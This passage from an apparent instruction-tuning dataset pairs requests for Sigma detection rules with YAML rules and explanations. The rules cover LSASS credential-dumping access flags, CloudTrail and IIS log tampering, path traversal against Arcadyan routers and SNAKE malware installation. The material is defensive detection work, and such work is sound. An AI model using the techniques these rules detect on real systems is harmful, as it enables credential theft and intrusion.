      "answer": "In order to detect attempts to use screencapture to collect macOS screenshots, you should monitor the creation of processes on macOS systems, specifically focusing on instances where the screencapture utility, located at '/usr/sbin/screencapture', is executed. This activity can be indicative of an attempt to capture the content displayed on the user's screen, potentially for malicious purposes. Keep in mind that there may be legitimate reasons for users to take screenshots, which should be considered as potential false positives. The severity of this type of activity is generally low, but it should not be ignored as it may represent a technique used in the initial stages of an attack to gather information."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an security threat is detected in Okta..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a security threat is detected in Okta, you should monitor the logs produced by Okta services for specific events that indicate a threat has been detected. Specifically, look for events with the type \"security.threat.detected\". These events signal that Okta has identified a potential security issue. It's important to address these threats with a medium level of urgency, although be aware that some events might be false positives where the activity is benign and does not actually pose any security risk. Nevertheless, all detected threats should be investigated to determine their legitimacy and impact.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: okta\n    service: okta\ndetection:\n    selection:\n        eventtype: security.threat.detected\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: okta\n    service: okta\ndetection:\n    selection:\n        eventtype: security.threat.detected\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "when an security threat is detected in Okta.",
      "answer": "In order to detect when a security threat is detected in Okta, you should monitor the logs produced by Okta services for specific events that indicate a threat has been detected. Specifically, look for events with the type \"security.threat.detected\". These events signal that Okta has identified a potential security issue. It's important to address these threats with a medium level of urgency, although be aware that some events might be false positives where the activity is benign and does not actually pose any security risk. Nevertheless, all detected threats should be investigated to determine their legitimacy and impact."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credential.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credentials, you should: Monitor Windows application logs, specifically looking for error events from the 'Application Error' provider. The key details to watch include an Event ID of 1000, which indicates an application error. Specifically, focus on instances where the application name is 'lsass.exe', and the exception code is 'c0000001', signaling a STATUS_UNSUCCESSFUL error. This setup might flag the rare legitimate crashing of the lsass process, so it's important to assess these alerts with that consideration in mind. This monitoring strategy is crucial for identifying potentially malicious activities associated with credential theft techniques that intentionally crash the Local Security Authority Subsystem Service (LSASS) to extract credentials, positioning this approach as a high-level defensive measure against such attack methodologies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: application\ndetection:\n    selection:\n        Provider_Name: 'Application Error'\n        EventID: 1000\n        AppName: 'lsass.exe'\n        ExceptionCode: 'c0000001' # STATUS_UNSUCCESSFUL\n    condition: selection\nfalsepositives:\n    - Rare legitimate crashing of the lsass process\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: application\ndetection:\n    selection:\n        Provider_Name: 'Application Error'\n        EventID: 1000\n        AppName: 'lsass.exe'\n        ExceptionCode: 'c0000001' # STATUS_UNSUCCESSFUL\n    condition: selection\nfalsepositives:\n    - Rare legitimate crashing of the lsass process\nlevel: high\n",
      "question": "Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credential",
      "answer": "In order to detect Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credentials, you should: Monitor Windows application logs, specifically looking for error events from the 'Application Error' provider. The key details to watch include an Event ID of 1000, which indicates an application error. Specifically, focus on instances where the application name is 'lsass.exe', and the exception code is 'c0000001', signaling a STATUS_UNSUCCESSFUL error. This setup might flag the rare legitimate crashing of the lsass process, so it's important to assess these alerts with that consideration in mind. This monitoring strategy is crucial for identifying potentially malicious activities associated with credential theft techniques that intentionally crash the Local Security Authority Subsystem Service (LSASS) to extract credentials, positioning this approach as a high-level defensive measure against such attack methodologies."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Rule to detect the Hybrid Connection Manager service installation..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the Hybrid Connection Manager service installation, you should focus on monitoring Windows security logs specifically for the event ID 4697, which is logged when a new service is installed on the system. The service of interest in this context is the \"HybridConnectionManager.\" You should look for instances where both the service name is \"HybridConnectionManager\" and the service file name contains the text \"HybridConnectionManager.\" This event logging is contingent upon having the 'System Security Extension' audit subcategory enabled, as this allows for the logging of such events. Be aware that there might be legitimate uses of the Hybrid Connection Manager, especially in scenarios involving Azure function apps, which can result in false positive alerts. Given the nature of this detection and its specificity in targeting a service installation related to potential cybersecurity threats, the level of alert is considered high. Identifying and monitoring for this specific event involves understanding intrusion tactics, but it directly ties into recognizing potential unauthorized or malicious service installations, which could be indicative of a broader attack campaign or infrastructure compromise.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceName: HybridConnectionManager\n        ServiceFileName|contains: HybridConnectionManager\n    condition: selection\nfalsepositives:\n    - Legitimate use of Hybrid Connection Manager via Azure function apps.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceName: HybridConnectionManager\n        ServiceFileName|contains: HybridConnectionManager\n    condition: selection\nfalsepositives:\n    - Legitimate use of Hybrid Connection Manager via Azure function apps.\nlevel: high\n",
      "question": "Rule to detect the Hybrid Connection Manager service installation.",
      "answer": "In order to detect the Hybrid Connection Manager service installation, you should focus on monitoring Windows security logs specifically for the event ID 4697, which is logged when a new service is installed on the system. The service of interest in this context is the \"HybridConnectionManager.\" You should look for instances where both the service name is \"HybridConnectionManager\" and the service file name contains the text \"HybridConnectionManager.\" This event logging is contingent upon having the 'System Security Extension' audit subcategory enabled, as this allows for the logging of such events. Be aware that there might be legitimate uses of the Hybrid Connection Manager, especially in scenarios involving Azure function apps, which can result in false positive alerts. Given the nature of this detection and its specificity in targeting a service installation related to potential cybersecurity threats, the level of alert is considered high. Identifying and monitoring for this specific event involves understanding intrusion tactics, but it directly ties into recognizing potential unauthorized or malicious service installations, which could be indicative of a broader attack campaign or infrastructure compromise."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling, deleting and updating of a Trail.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling, deleting, and updating of a Trail, you should: Monitor AWS CloudTrail logs for specific event activities including StopLogging, UpdateTrail, and DeleteTrail actions. These activities are indicative of attempts to manipulate or interfere with the logging mechanisms, which may suggest a malicious actor's intent to evade detection. It's important to note that there could be legitimate reasons for these actions, such as valid changes in the configuration of a Trail, hence any alerts should be investigated to differentiate between benign and malicious behavior. The detection focuses on levering CloudTrail data, specifically looking for events generated by AWS services that indicate the mentioned actions. This approach is essential for maintaining the integrity of log management and monitoring practices within AWS environments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: cloudtrail.amazonaws.com\n        eventName:\n            - StopLogging\n            - UpdateTrail\n            - DeleteTrail\n    condition: selection_source\nfalsepositives:\n    - Valid change in a Trail\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: cloudtrail.amazonaws.com\n        eventName:\n            - StopLogging\n            - UpdateTrail\n            - DeleteTrail\n    condition: selection_source\nfalsepositives:\n    - Valid change in a Trail\nlevel: medium\n",
      "question": "disabling, deleting and updating of a Trail",
      "answer": "In order to detect disabling, deleting, and updating of a Trail, you should: Monitor AWS CloudTrail logs for specific event activities including StopLogging, UpdateTrail, and DeleteTrail actions. These activities are indicative of attempts to manipulate or interfere with the logging mechanisms, which may suggest a malicious actor's intent to evade detection. It's important to note that there could be legitimate reasons for these actions, such as valid changes in the configuration of a Trail, hence any alerts should be investigated to differentiate between benign and malicious behavior. The detection focuses on levering CloudTrail data, specifically looking for events generated by AWS services that indicate the mentioned actions. This approach is essential for maintaining the integrity of log management and monitoring practices within AWS environments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting process access to LSASS memory with suspicious access flags.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect process access to LSASS memory with suspicious access flags, you should monitor Windows processes based on process access attempts that may be indicative of an attack. Specifically, focus on processes attempting to access 'lsass.exe', a critical Windows process associated with local security and authentication. Pay attention to attempts with granted access levels ending in '30', '50', '70', '90', 'B0', 'D0', 'F0', '18', '38', '58', '78', '98', 'B8', 'D8', 'F8', '1A', '3A', '5A', '7A', '9A', 'BA', 'DA', 'FA', and specifically '0x14C2'. These levels of access could indicate malicious intent such as credential dumping.\n\nHowever, it's crucial to exclude legitimate software from triggering false alarms by considering the source of the process access request. Exclude known paths related to common legitimate applications such as Task Manager, Malwarebytes, certain built-in Windows utilities, Cisco AnyConnect, Microsoft's Windows Defender, VMware Tools, and others specified in the rule. Additionally, consider excluding Antivirus or EDR agents specific paths, which might otherwise generate false positives.\n\nFocus especially on detecting malicious activities that haven't been excluded by the filters, as this maintains a balance between security monitoring and operational functionality, minimizing the disruption caused by false positive alerts. This approach covers a substantial portion of the methods attackers might use to access sensitive LSASS memory content, aiming to exploit it for credentials theft while reducing the noise from legitimate security and system management tools.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith:\n            # - '10'  # covered in rule 678dfc63-fefb-47a5-a04c-26bcf8cc9f65\n            - '30'\n            - '50'\n            - '70'\n            - '90'\n            - 'B0'\n            - 'D0'\n            - 'F0'\n            - '18'\n            - '38'\n            - '58'\n            - '78'\n            - '98'\n            - 'B8'\n            - 'D8'\n            - 'F8'\n            - '1A'\n            - '3A'\n            - '5A'\n            - '7A'\n            - '9A'\n            - 'BA'\n            - 'DA'\n            - 'FA'\n            - '0x14C2'  # https://github.com/b4rtik/ATPMiniDump/blob/76304f93b390af3bb66e4f451ca16562a479bdc9/ATPMiniDump/ATPMiniDump.c\n    # Absolute paths to programs that cause false positives\n    filter_absolute:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\taskmgr.exe'\n            - 'C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe'\n            - 'C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe'\n            - 'C:\\WINDOWS\\system32\\taskhostw.exe'\n            - 'C:\\Program Files\\Windows Defender\\MsMpEng.exe'\n            - 'C:\\Windows\\SysWOW64\\msiexec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n            - 'C:\\Windows\\System32\\lsass.exe'\n            - 'C:\\WINDOWS\\System32\\perfmon.exe'\n            - 'C:\\Windows\\System32\\MRT.exe'\n            - 'C:\\Program Files\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe'\n            - 'C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe'\n    # VSCode\n    filter_vscode:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|endswith: '\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe'\n    # Windows Defender\n    filter_windefend_1:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    filter_windefend_2:\n        CallTrace|contains|all:\n            - '|C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{'\n            - '}\\mpengine.dll+'\n        GrantedAccess: '0x1418'\n    filter_windefend_3:\n        # Trigger Win7\n        SourceImage: 'C:\\Program Files\\Microsoft Security Client\\MsMpEng.exe'\n        GrantedAccess: '0x1418'\n    # VMware Tools\n    filter_vmwaretools:\n        SourceImage|startswith: 'C:\\ProgramData\\VMware\\VMware Tools\\'\n        SourceImage|endswith: '\\vmtoolsd.exe'\n    # Antivirus and EDR agents\n    filter_generic_av:\n        # When using this rule. Remove this filter and replace it by the path of the specific AV you use\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        SourceImage|contains: 'Antivirus'\n    filter_mrt:\n        SourceImage: 'C:\\WINDOWS\\system32\\MRT.exe'\n        GrantedAccess: '0x1418'\n    filter_mcafee:\n        SourceImage: 'C:\\Program Files\\Common Files\\McAfee\\MMSSHost\\MMSSHOST.exe'\n    filter_nextron:\n        # Remove this if you don't use Nextron Products\n        SourceImage|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n        GrantedAccess: '0x1fffff'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Legitimate software such as AV and EDR\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith:\n            # - '10'  # covered in rule 678dfc63-fefb-47a5-a04c-26bcf8cc9f65\n            - '30'\n            - '50'\n            - '70'\n            - '90'\n            - 'B0'\n            - 'D0'\n            - 'F0'\n            - '18'\n            - '38'\n            - '58'\n            - '78'\n            - '98'\n            - 'B8'\n            - 'D8'\n            - 'F8'\n            - '1A'\n            - '3A'\n            - '5A'\n            - '7A'\n            - '9A'\n            - 'BA'\n            - 'DA'\n            - 'FA'\n            - '0x14C2'  # https://github.com/b4rtik/ATPMiniDump/blob/76304f93b390af3bb66e4f451ca16562a479bdc9/ATPMiniDump/ATPMiniDump.c\n    # Absolute paths to programs that cause false positives\n    filter_absolute:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\taskmgr.exe'\n            - 'C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe'\n            - 'C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe'\n            - 'C:\\WINDOWS\\system32\\taskhostw.exe'\n            - 'C:\\Program Files\\Windows Defender\\MsMpEng.exe'\n            - 'C:\\Windows\\SysWOW64\\msiexec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n            - 'C:\\Windows\\System32\\lsass.exe'\n            - 'C:\\WINDOWS\\System32\\perfmon.exe'\n            - 'C:\\Windows\\System32\\MRT.exe'\n            - 'C:\\Program Files\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe'\n            - 'C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe'\n    # VSCode\n    filter_vscode:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|endswith: '\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe'\n    # Windows Defender\n    filter_windefend_1:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    filter_windefend_2:\n        CallTrace|contains|all:\n            - '|C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{'\n            - '}\\mpengine.dll+'\n        GrantedAccess: '0x1418'\n    filter_windefend_3:\n        # Trigger Win7\n        SourceImage: 'C:\\Program Files\\Microsoft Security Client\\MsMpEng.exe'\n        GrantedAccess: '0x1418'\n    # VMware Tools\n    filter_vmwaretools:\n        SourceImage|startswith: 'C:\\ProgramData\\VMware\\VMware Tools\\'\n        SourceImage|endswith: '\\vmtoolsd.exe'\n    # Antivirus and EDR agents\n    filter_generic_av:\n        # When using this rule. Remove this filter and replace it by the path of the specific AV you use\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        SourceImage|contains: 'Antivirus'\n    filter_mrt:\n        SourceImage: 'C:\\WINDOWS\\system32\\MRT.exe'\n        GrantedAccess: '0x1418'\n    filter_mcafee:\n        SourceImage: 'C:\\Program Files\\Common Files\\McAfee\\MMSSHost\\MMSSHOST.exe'\n    filter_nextron:\n        # Remove this if you don't use Nextron Products\n        SourceImage|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n        GrantedAccess: '0x1fffff'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Legitimate software such as AV and EDR\nlevel: high\n",
      "question": "process access to LSASS memory with suspicious access flags",
      "answer": "In order to detect process access to LSASS memory with suspicious access flags, you should monitor Windows processes based on process access attempts that may be indicative of an attack. Specifically, focus on processes attempting to access 'lsass.exe', a critical Windows process associated with local security and authentication. Pay attention to attempts with granted access levels ending in '30', '50', '70', '90', 'B0', 'D0', 'F0', '18', '38', '58', '78', '98', 'B8', 'D8', 'F8', '1A', '3A', '5A', '7A', '9A', 'BA', 'DA', 'FA', and specifically '0x14C2'. These levels of access could indicate malicious intent such as credential dumping.\n\nHowever, it's crucial to exclude legitimate software from triggering false alarms by considering the source of the process access request. Exclude known paths related to common legitimate applications such as Task Manager, Malwarebytes, certain built-in Windows utilities, Cisco AnyConnect, Microsoft's Windows Defender, VMware Tools, and others specified in the rule. Additionally, consider excluding Antivirus or EDR agents specific paths, which might otherwise generate false positives.\n\nFocus especially on detecting malicious activities that haven't been excluded by the filters, as this maintains a balance between security monitoring and operational functionality, minimizing the disruption caused by false positive alerts. This approach covers a substantial portion of the methods attackers might use to access sensitive LSASS memory content, aiming to exploit it for credentials theft while reducing the noise from legitimate security and system management tools."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation of vulnerabilities in Arcadyan routers as reported in CVE-2021-20090 and CVE-2021-20091..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation of vulnerabilities in Arcadyan routers as reported in CVE-2021-20090 and CVE-2021-20091, you should: Monitor web server logs for specific patterns that indicate an attack attempt. Look for instances where the query string in the URL (cs-uri-query) contains patterns related to path traversal ('..%2f') which is a technique used to move up a directory level, bypassing authorization mechanisms. This pattern is associated with CVE-2021-20090. Moreover, pay attention to sequences where the query string combines this path traversal with an attempt to inject or manipulate configuration files, specifically targeting 'apply_abstract.cgi'. This behavior indicates a chaining of CVE-2021-20090 with CVE-2021-20091, aiming at config file injection. Additionally, be vigilant for query strings that direct access to directories commonly not requiring authentication such as '/images/', '/js/', '/css/', as well as specific login-related pages like '/setup_top_login.htm', '/login.html', '/loginerror.html', '/loginexclude.html', and '/loginlock.html'. An alert should be raised when evidence of path traversal or config file injection is detected in conjunction with requests to these non-authenticated directories or pages, suggesting an exploitation attempt. It\u2019s critical to note that this type of monitoring is set at the highest severity level due to the significant risk posed by these vulnerabilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    path_traversal:\n    # CVE-2021-20090 (Bypass Auth: Path Traversal)\n        cs-uri-query|contains: '..%2f'\n    config_file_inj:\n        cs-uri-query|contains|all: # Chaining of CVE-2021-20090 (Bypass Auth) and CVE-2021-20091 (Config File Injection)\n            - '..%2f'\n            - 'apply_abstract.cgi'\n    noauth_list:\n        cs-uri-query|contains:\n            - '/images/'\n            - '/js/'\n            - '/css/'\n            - '/setup_top_login.htm'\n            - '/login.html'\n            - '/loginerror.html'\n            - '/loginexclude.html'\n            - '/loginlock.html'\n    condition: (path_traversal or config_file_inj) and noauth_list\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    path_traversal:\n    # CVE-2021-20090 (Bypass Auth: Path Traversal)\n        cs-uri-query|contains: '..%2f'\n    config_file_inj:\n        cs-uri-query|contains|all: # Chaining of CVE-2021-20090 (Bypass Auth) and CVE-2021-20091 (Config File Injection)\n            - '..%2f'\n            - 'apply_abstract.cgi'\n    noauth_list:\n        cs-uri-query|contains:\n            - '/images/'\n            - '/js/'\n            - '/css/'\n            - '/setup_top_login.htm'\n            - '/login.html'\n            - '/loginerror.html'\n            - '/loginexclude.html'\n            - '/loginlock.html'\n    condition: (path_traversal or config_file_inj) and noauth_list\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "exploitation of vulnerabilities in Arcadyan routers as reported in CVE-2021-20090 and CVE-2021-20091.",
      "answer": "In order to detect exploitation of vulnerabilities in Arcadyan routers as reported in CVE-2021-20090 and CVE-2021-20091, you should: Monitor web server logs for specific patterns that indicate an attack attempt. Look for instances where the query string in the URL (cs-uri-query) contains patterns related to path traversal ('..%2f') which is a technique used to move up a directory level, bypassing authorization mechanisms. This pattern is associated with CVE-2021-20090. Moreover, pay attention to sequences where the query string combines this path traversal with an attempt to inject or manipulate configuration files, specifically targeting 'apply_abstract.cgi'. This behavior indicates a chaining of CVE-2021-20090 with CVE-2021-20091, aiming at config file injection. Additionally, be vigilant for query strings that direct access to directories commonly not requiring authentication such as '/images/', '/js/', '/css/', as well as specific login-related pages like '/setup_top_login.htm', '/login.html', '/loginerror.html', '/loginexclude.html', and '/loginlock.html'. An alert should be raised when evidence of path traversal or config file injection is detected in conjunction with requests to these non-authenticated directories or pages, suggesting an exploitation attempt. It\u2019s critical to note that this type of monitoring is set at the highest severity level due to the significant risk posed by these vulnerabilities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting deletion of IIS WebServer access logs which may indicate an attempt to destroy forensic evidence.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the deletion of IIS WebServer access logs which may indicate an attempt to destroy forensic evidence, you should: Monitor for deletion events in Windows environments specifically targeting files within the directory path '\\inetpub\\logs\\LogFiles\\' with a file extension of '.log'. This focuses on identifying actions where an attacker may attempt to erase their tracks by removing access logs from the IIS WebServer, a critical piece of forensic evidence in cybersecurity investigations. Be aware that not every deletion event flagged through this monitoring will be malicious in nature. Common legitimate reasons for these events include the uninstallation of the IIS service itself or routine log rotation procedures. The risk level associated with this activity is considered medium, reflecting its potential importance in an investigation balanced by the likelihood of legitimate causes for such events.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_delete\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains: '\\inetpub\\logs\\LogFiles\\'\n        TargetFilename|endswith: '.log'\n    condition: selection\nfalsepositives:\n    - During uninstallation of the IIS service\n    - During log rotation\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_delete\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains: '\\inetpub\\logs\\LogFiles\\'\n        TargetFilename|endswith: '.log'\n    condition: selection\nfalsepositives:\n    - During uninstallation of the IIS service\n    - During log rotation\nlevel: medium\n",
      "question": "deletion of IIS WebServer access logs which may indicate an attempt to destroy forensic evidence",
      "answer": "In order to detect the deletion of IIS WebServer access logs which may indicate an attempt to destroy forensic evidence, you should: Monitor for deletion events in Windows environments specifically targeting files within the directory path '\\inetpub\\logs\\LogFiles\\' with a file extension of '.log'. This focuses on identifying actions where an attacker may attempt to erase their tracks by removing access logs from the IIS WebServer, a critical piece of forensic evidence in cybersecurity investigations. Be aware that not every deletion event flagged through this monitoring will be malicious in nature. Common legitimate reasons for these events include the uninstallation of the IIS service itself or routine log rotation procedures. The risk level associated with this activity is considered medium, reflecting its potential importance in an investigation balanced by the likelihood of legitimate causes for such events."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of renamed Remote Utilities (RURAT) via Product PE header field.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of renamed Remote Utilities (RURAT) via Product PE header field, you should: Look for process creation events within Windows operating systems that indicate involvement of the Remote Utilities software, identified by the product name in the process execution's PE (Portable Executable) header. Specifically, search for events where the product is listed as 'Remote Utilities'. However, to accurately pinpoint malicious activity, exclude any process creation events that conclude with the execution image names '\\rutserv.exe' or '\\rfusclient.exe', as these are legitimate Remote Utilities executables. This approach aims at identifying instances where attackers might rename legitimate Remote Utilities executables to bypass detection mechanisms. Although there might be cases where these criteria are met without any malicious intent, such occurrences are presently unidentified, prompting a medium level of alertness. The underlying tactics and techniques associated with this activity include Execution, Persistence, and Command and Control, which align with methods typically employed by adversaries to maintain control over compromised systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Remote Utilities'\n    filter:\n        Image|endswith:\n            - '\\rutserv.exe'\n            - '\\rfusclient.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Remote Utilities'\n    filter:\n        Image|endswith:\n            - '\\rutserv.exe'\n            - '\\rfusclient.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of renamed Remote Utilities (RURAT) via Product PE header field",
      "answer": "In order to detect execution of renamed Remote Utilities (RURAT) via Product PE header field, you should: Look for process creation events within Windows operating systems that indicate involvement of the Remote Utilities software, identified by the product name in the process execution's PE (Portable Executable) header. Specifically, search for events where the product is listed as 'Remote Utilities'. However, to accurately pinpoint malicious activity, exclude any process creation events that conclude with the execution image names '\\rutserv.exe' or '\\rfusclient.exe', as these are legitimate Remote Utilities executables. This approach aims at identifying instances where attackers might rename legitimate Remote Utilities executables to bypass detection mechanisms. Although there might be cases where these criteria are met without any malicious intent, such occurrences are presently unidentified, prompting a medium level of alertness. The underlying tactics and techniques associated with this activity include Execution, Persistence, and Command and Control, which align with methods typically employed by adversaries to maintain control over compromised systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific command line arguments sequence seen used by SNAKE malware during its installation as described by CISA in their report.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a specific command line arguments sequence seen used by SNAKE malware during its installation as described by CISA in their report, you should: Monitor the creation of processes on Windows systems, paying special attention to command lines that follow a very specific pattern. This pattern consists of two critical arguments passed to an executable: the first is a 64-character hexadecimal string, representing a SHA-256 hashed wide character string. This argument is significant as it is rarely used in common applications and can be a strong indicator of malicious activity. The second argument, also hexadecimal, must be at least 16 characters long, indicating the minimum required length for an AES initialization vector (IV). This specific sequence of arguments, when observed, points to the installation routine of the SNAKE malware, leveraging these cryptographic elements for its execution. The rarity of such command line patterns in benign applications coupled with the high level of specificity associated with this malware's installation method makes the likelihood of false positives low. Monitoring for and identifying these command line arguments can significantly contribute to thwarting attempts of SNAKE malware installation on Windows systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # This CLI regex is based on the following description from the report:\n        #   The jpsetup.exe installer requires two arguments to be passed via the command line for execution\n        #   The first argument is a wide character string hashed with SHA-256 twice -> We assume that the first argument is of length SHA256\n        #   The AES initialization vector (IV) consists of the first 16 bytes of the second argument to jpsetup.exe -> We assume that the second argument is of at least 16 bytes (16 characters)\n        CommandLine|re: '\\s[a-fA-F0-9]{64}\\s[a-fA-F0-9]{16}'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # This CLI regex is based on the following description from the report:\n        #   The jpsetup.exe installer requires two arguments to be passed via the command line for execution\n        #   The first argument is a wide character string hashed with SHA-256 twice -> We assume that the first argument is of length SHA256\n        #   The AES initialization vector (IV) consists of the first 16 bytes of the second argument to jpsetup.exe -> We assume that the second argument is of at least 16 bytes (16 characters)\n        CommandLine|re: '\\s[a-fA-F0-9]{64}\\s[a-fA-F0-9]{16}'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "specific command line arguments sequence seen used by SNAKE malware during its installation as described by CISA in their report",
      "answer": "In order to detect a specific command line arguments sequence seen used by SNAKE malware during its installation as described by CISA in their report, you should: Monitor the creation of processes on Windows systems, paying special attention to command lines that follow a very specific pattern. This pattern consists of two critical arguments passed to an executable: the first is a 64-character hexadecimal string, representing a SHA-256 hashed wide character string. This argument is significant as it is rarely used in common applications and can be a strong indicator of malicious activity. The second argument, also hexadecimal, must be at least 16 characters long, indicating the minimum required length for an AES initialization vector (IV). This specific sequence of arguments, when observed, points to the installation routine of the SNAKE malware, leveraging these cryptographic elements for its execution. The rarity of such command line patterns in benign applications coupled with the high level of specificity associated with this malware's installation method makes the likelihood of false positives low. Monitoring for and identifying these command line arguments can significantly contribute to thwarting attempts of SNAKE malware installation on Windows systems."
    }
  },
  {
